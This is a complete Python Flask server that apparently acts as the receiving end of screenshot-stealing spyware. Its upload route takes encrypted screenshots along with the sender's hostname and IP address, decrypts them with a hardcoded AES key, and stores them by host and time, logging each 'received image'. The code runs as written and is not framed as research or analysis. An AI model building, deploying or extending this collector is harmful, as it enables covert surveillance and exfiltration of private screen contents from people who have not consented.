from flask import Flask, request, jsonify
from Crypto.Cipher import AES
import base64, os
from datetime import datetime

app = Flask(__name__)
SECRET_KEY = b'ThisIsASecretKey'
SAVE_FOLDER = "received"
os.makedirs(SAVE_FOLDER, exist_ok=True)

def decrypt_aes(data, key):
    nonce = base64.b64decode(data['nonce'])
    tag = base64.b64decode(data['tag'])
    ciphertext = base64.b64decode(data['data'])
    cipher = AES.new(key, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

@app.route("/")
def index():
    return "Server is running."

@app.route("/upload", methods=["POST"])
def upload():
    try:
        content = request.get_json()
        info = content["system_info"]
        img_data = decrypt_aes(content["screenshot"], SECRET_KEY)

        filename = f"{info['hostname']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        path = os.path.join(SAVE_FOLDER, filename)
        with open(path, "wb") as f:
            f.write(img_data)

        print(f"[+] Received image from {info['ip']} - saved as {filename}")
        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"status": "fail", "error": str(e)}), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
